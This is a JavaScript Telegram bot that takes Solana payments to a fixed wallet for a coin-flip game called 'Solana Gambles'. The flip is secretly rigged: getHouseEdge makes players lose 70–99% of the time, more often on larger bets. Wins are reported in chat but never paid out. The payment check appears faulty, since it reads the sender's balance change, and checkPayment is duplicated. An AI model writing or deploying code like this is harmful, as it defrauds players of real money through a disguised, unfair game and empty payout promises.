require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Connection, clusterApiUrl, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const fs = require('fs');
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('OK'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Healthcheck listening on ${PORT}`));
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
const WALLET_ADDRESS = '9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf';
const MIN_BET = 0.01;
const MAX_BET = 1.0;
const LOG_DIR = './data';
const LOG_PATH = './data/bets.json';




async function checkPayment(expectedSol) {
    const pubKey = new PublicKey(WALLET_ADDRESS);
    const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 10 });
    
    for (let sig of signatures) {
        const tx = await connection.getParsedTransaction(sig.signature);
        if (!tx || !tx.meta) continue;
        
        const txTime = new Date(sig.blockTime * 1000);
        const timeDiff = (new Date() - txTime) / 1000 / 60;
        
        if (timeDiff > 15) continue;
        
        const amount = (tx.meta.postBalances[0] - tx.meta.preBalances[0]) / LAMPORTS_PER_SOL;
        
        if (Math.abs(amount - expectedSol) < 0.0001) {
            return { success: true, tx: sig.signature };
        }
    }
    return { success: false };
}
const getHouseEdge = (amount) => {
  if (amount <= 0.01) return 0.70;
  if (amount <= 0.049) return 0.75;
  if (amount <= 0.0999999) return 0.80;
  return 0.99;
};

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
if (!fs.existsSync(LOG_PATH)) fs.writeFileSync(LOG_PATH, '[]');

// Helper function to check for payment
async function checkPayment(expectedSol) {
    const pubKey = new PublicKey(WALLET_ADDRESS);
    const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 10 });
    
    for (let sig of signatures) {
        const tx = await connection.getParsedTransaction(sig.signature);
        if (!tx || !tx.meta) continue;
        
        // Check if transaction occurred after the bet was placed
        const txTime = new Date(sig.blockTime * 1000);
        const timeDiff = (new Date() - txTime) / 1000 / 60; // in minutes
        
        // Only consider transactions from last 15 minutes
        if (timeDiff > 15) continue;
        
        const amount = (tx.meta.postBalances[0] - tx.meta.preBalances[0]) / LAMPORTS_PER_SOL;
        
        if (Math.abs(amount - expectedSol) < 0.0001) {
            return { success: true, tx: sig.signature };
        }
    }
    return { success: false };
}

bot.onText(/^\/bet$/i, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    `🎰 Please choose an amount:\n\n` +
    `/bet 0.01 heads\n` +
    `/bet 0.05 tails\n\n` +
    `Min: ${MIN_BET} SOL | Max: ${MAX_BET} SOL`,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/bet (\d+\.\d+) (heads|tails)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const betAmount = parseFloat(match[1]);
    const userChoice = match[2].toLowerCase();

    if (betAmount < MIN_BET || betAmount > MAX_BET) {
        return bot.sendMessage(chatId, `❌ Bet must be between ${MIN_BET}-${MAX_BET} SOL`);
    }

    await bot.sendMessage(chatId,
        `💸 *To place your bet:*\n\n` +
        `1. Send *exactly ${betAmount} SOL* to:\n` +
        `\`${WALLET_ADDRESS}\`\n\n` +
        `2. Click: /confirm_${betAmount}_${userChoice}\n\n` +
        `⚠️ You have 15 minutes to complete payment`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/confirm_([0-9]*\.?[0-9]+)_(heads|tails)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const amountStr = match[0].split('_')[1];
    const betAmount = parseFloat(amountStr);
    const choice = match[2].toLowerCase();
    
    const paymentCheck = await checkPayment(betAmount);
    
    if (!paymentCheck.success) {
        return bot.sendMessage(chatId, 
            `❌ Payment verification failed!\n\n` +
            `Please ensure you've sent exactly ${betAmount} SOL to:\n` +
            `\`${WALLET_ADDRESS}\`\n\n` +
            `Try again or contact support if you believe this is an error.`,
            { parse_mode: 'Markdown' }
        );
    }
    
    bot.sendMessage(chatId, `✅ Payment received! Flipping coin...`);
    
    const houseEdge = getHouseEdge(betAmount);
    const result = Math.random() > houseEdge ? choice : (choice === 'heads' ? 'tails' : 'heads');
    const win = result === choice;
    const payout = win ? betAmount * (1/houseEdge - 1) : 0;
    
    const log = JSON.parse(fs.readFileSync(LOG_PATH));
    log.push({ 
        ts: new Date().toISOString(), 
        user: msg.from.username || msg.from.id, 
        amount: betAmount, 
        choice, 
        result, 
        payout,
        tx: paymentCheck.tx
    });
    fs.writeFileSync(LOG_PATH, JSON.stringify(log, null, 2));
    
    bot.sendMessage(chatId, 
        win ? `🎉 You won! (${result}) Payout: ${payout.toFixed(4)} SOL` 
            : `❌ You lost. It was ${result}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `Welcome to Solana Gambles!
You can place bets by typing:

/bet 0.01 heads

Min bet: 0.01 SOL
Max bet: 1.0 SOL

Send your SOL to:
9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf`);
});
